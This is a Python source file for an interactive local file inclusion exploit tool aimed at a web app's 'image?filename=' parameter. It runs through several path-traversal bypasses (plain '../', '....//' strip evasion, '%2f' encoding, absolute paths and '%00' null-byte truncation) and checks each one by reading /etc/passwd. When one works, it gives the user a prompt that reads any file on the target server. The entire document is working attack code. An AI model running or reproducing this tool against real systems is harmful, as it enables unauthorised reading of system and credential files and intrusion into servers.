try:
    import requests, sys
    from pathlib import Path
    sys.path.append(str(Path(__file__).parent.parent))
    from config import parse_args, is_success
except ImportError as e:
    print(e)

class LocalFile:
    def __init__(self, url):
        self.url = url.rstrip("/")
        self.session = requests.Session()
        self.exploit_url = f"{self.url}/image?filename="
        args, proxy = parse_args()
        if proxy:
            self.session.proxies.update(proxy)  
        self.session.verify = False

    def exploit(self, format, is_null_byte=False):
        if is_null_byte:
            if self.session.get(url=f"{format}etc/passwd%00.png").status_code != 200:
                print("LFI method didn't work")
                return False
        if self.session.get(url=f"{format}etc/passwd").status_code != 200 or not is_success(self):
            print("LFI method didn't work")
            return False
        print(self.exploit_url)
        
        print(f"Exploitation successfull\nSide note: To quit, just enter stop ദ്ദി(｡•̀ ,<)~✩‧₊")
        while True:
            try:
                payload_unfiltered = input("Enter location of file to see: ")
                if payload_unfiltered.lower() in ["quit", "stop", "exit"]:
                    print("Exiting terminal....")
                    return True
                if payload_unfiltered is None or payload_unfiltered == "":
                    print("Enter the location please")
                    continue    
                payload = payload_unfiltered.lstrip("/")
                if is_null_byte == True:
                    file_upload_result = self.session.get(url=f"{format}{payload}%00.png")
                    print(file_upload_result.text)
                else:
                    file_upload_result = self.session.get(url=f"{format}{payload}")
                    print(file_upload_result.text)
                if file_upload_result.status_code != 200:
                    print("Network error. (TωT)")
                    return False

            except KeyboardInterrupt:
                print("\n\nKeyBoard Interuption. Exiting shell...")
                return True
            except EOFError:
                print("\nExiting shell...")
                return False
            except Exception as e:
                print(f"Error: {e}")
                return False
    def simple_lfi(self):
        print("Trying simple local file inclusion")
        return(self.exploit(f"{self.exploit_url}../../../../../"))

    def absolute_path(self):
        print("Trying absolute path local file inclusion")
        return(self.exploit(f"{self.exploit_url}/"))
    
    def non_recursive_strip(self):
        print("Trying non recursive strip")
        return(self.exploit(f"{self.exploit_url}....//....//....//....//....//....//"))
    
    def encoded_payload(self):
        print("Trying to encoding payload")
        return(self.exploit(f"{self.exploit_url}..%2f..%2f..%2f..%2f"))
    
    def start_validation(self):
        print("Trying to validate lfi from start")
        return(self.exploit(f"{self.exploit_url}/var/www/images/../../../../"))
    
    def null_byte(self):
        print("Trying to null byte")
        return(self.exploit(f"{self.exploit_url}../../../../", is_null_byte=True))
    
    def main(self):
        exploit_methods = [
            ("simple lfi", self.simple_lfi),
            ("absolute path", self.absolute_path),
            ("non recursive", self.non_recursive_strip),
            ("encoded url", self.encoded_payload),
            ("start validation", self.start_validation),
            ("null byte", self.null_byte)
        ]
        for method_name, method in exploit_methods:
            try:
                if method():
                    print(f"Success with {method_name}")
                    print("Bye bye ˙◠˙")
                    return True
            except Exception as e:
                print(f"{method_name} failed: {e}")
                continue
        print("All exploits failed. Sorry you will have to search for better programmer than me. (╥﹏╥)")
        return False

if __name__ == "__main__":
    while True:
        url = input("Enter the url: ")
        if url is None or url == "":
            print("Please enter the url  (>ᴗ•) !")
            continue
        else: 
            start = LocalFile(url)
            start.main()
            break